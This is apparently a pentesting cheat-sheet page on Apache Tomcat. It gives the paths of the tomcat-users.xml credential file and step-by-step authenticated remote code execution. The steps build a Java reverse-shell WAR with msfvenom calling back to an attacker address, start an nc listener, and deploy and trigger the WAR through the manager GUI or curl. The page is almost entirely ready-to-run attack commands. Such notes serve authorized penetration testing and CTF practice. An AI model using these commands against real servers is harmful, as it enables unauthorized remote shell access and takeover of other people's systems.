---
title: "Apache Tomcat"
date: 2024-7-2
tags: ["tomcat", "apache", "web server", "war", "java", "rce"]
---

---
### Config Location

```bash
/usr/share/tomcat9/etc/tomcat-users.xml
```

```bash
/etc/tomcat9/tomcat-users.xml
```

### RCE (Authenicated)

#### 1. Create a WAR file

```bash
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f war -o revshell.war
```

#### 2. Start a listener

```bash
rlwrap nc -lvnp 1337
```

#### 3a. Via Manager GUI

```bash
+--------------------------------------------+
| Exploit                                    |
+--------------------------------------------+
| 1. Login to Tomcat Web Application Manager |
| 2. WAR file to deploy -> Deploy            |
| 3. Click /revshell in Applications table   |
+--------------------------------------------+
```

#### 3b. Via Manager Script

```bash
curl -u '<USERNAME>:<PASSWORD>' http://example.com:8080/manager/text/deploy?path=/revshell --upload-file revshell.war
```

```bash
curl -s http://example.com:8080/revshell
```

<br>
